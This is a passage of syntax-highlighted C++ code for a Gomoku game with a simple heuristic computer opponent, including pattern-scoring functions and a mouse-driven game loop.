/ <span class="number">2</span>);</span><br><span class="line">		bar(<span class="number">0</span>, <span class="number">140</span>, <span class="number">100</span>, <span class="number">180</span>);</span><br><span class="line">		setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		xyprintf(<span class="number">10</span>, <span class="number">150</span>, <span class="string">&quot;黑方执棋&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">lian5</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ans &gt;= <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">100</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">100</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">3</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">80</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">80</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">chong4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">3</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">60</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">60</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live3</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">2</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">70</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">70</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">death3</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">2</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">50</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">50</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">1</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">40</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">40</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">death2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!flag1 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">					ans++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">					b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((ans &gt;= <span class="number">1</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">30</span>;</span><br><span class="line">			<span class="keyword">else</span> white[x][y] += <span class="number">30</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> b_x = <span class="number">8</span>, b_y = <span class="number">8</span>, w_x = <span class="number">8</span>, w_y = <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">memset</span>(black, <span class="number">0</span>, <span class="keyword">sizeof</span>(black));</span><br><span class="line">	<span class="built_in">memset</span>(white, <span class="number">0</span>, <span class="keyword">sizeof</span>(white));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">15</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!pos[i][j])</span><br><span class="line">			&#123;</span><br><span class="line">				pos[i][j] = <span class="number">-1</span>;</span><br><span class="line">				<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (lian5(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live4(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live3(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (chong4(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (death3(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live2(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (death2(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos[i][j] = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (lian5(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live4(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live3(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (chong4(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (death3(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (live2(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span> (death2(i, j))<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos[i][j] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (black[i][j] &gt; black[b_x][b_y])b_x = i, b_y = j;</span><br><span class="line">				<span class="keyword">if</span> (white[i][j] &gt; white[w_x][w_y])w_x = i, w_y = j;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Sleep(<span class="number">1000</span>);</span><br><span class="line">	<span class="keyword">if</span> (black[b_x][b_y] &lt;= white[w_x][w_y])Play(w_x + <span class="number">2</span>, w_y, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">else</span> Play(b_x + <span class="number">2</span>, b_y, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GameAI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> turn = <span class="number">0</span>;</span><br><span class="line">	key = <span class="literal">false</span>;</span><br><span class="line">	<span class="built_in">memset</span>(pos, <span class="number">0</span>, <span class="keyword">sizeof</span>(pos));</span><br><span class="line">	<span class="comment">/*setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class="line"><span class="comment">	bar(10, 200, 90, 230);</span></span><br><span class="line"><span class="comment">	setcolor(EGERGB(0, 0, 255));</span></span><br><span class="line"><span class="comment">	setfont(20, 0, &quot;宋体&quot;);</span></span><br><span class="line"><span class="comment">	xyprintf(10, 205, &quot;玩家先手&quot;);*/</span></span><br><span class="line">	mouse_msg msg;</span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span> (; is_run();)</span><br><span class="line">	&#123;</span><br><span class="line">		msg = getmouse();</span><br><span class="line">		<span class="keyword">if</span> (msg.is_up())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*if (flag)//flag标记是否开始游戏</span></span><br><span class="line"><span class="comment">			&#123;</span></span><br><span class="line"><span class="comment">				if (msg.x &gt;= 10 &amp;&amp; msg.x &lt;= 90 &amp;&amp; msg.y &gt;= 200 &amp;&amp; msg.y &lt;= 230)</span></span><br><span class="line"><span class="comment">				&#123;</span></span><br><span class="line"><span class="comment">					setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class="line"><span class="comment">					bar(10, 200, 90, 230);</span></span><br><span class="line"><span class="comment">					setcolor(EGERGB(0, 0, 255));</span></span><br><span class="line"><span class="comment">					setfont(20, 0, &quot;宋体&quot;);</span></span><br><span class="line"><span class="comment">					xyprintf(10, 205, &quot;电脑先手&quot;);</span></span><br><span class="line"><span class="comment">					flag = false;</span></span><br><span class="line"><span class="comment">				&#125;</span></span><br><span class="line"><span class="comment">			&#125;*/</span></span><br><span class="line">			<span class="keyword">if</span> (msg.x % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">						<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">						AI();</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">						<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">						AI();</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (msg.x % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">						<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">						AI();</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span 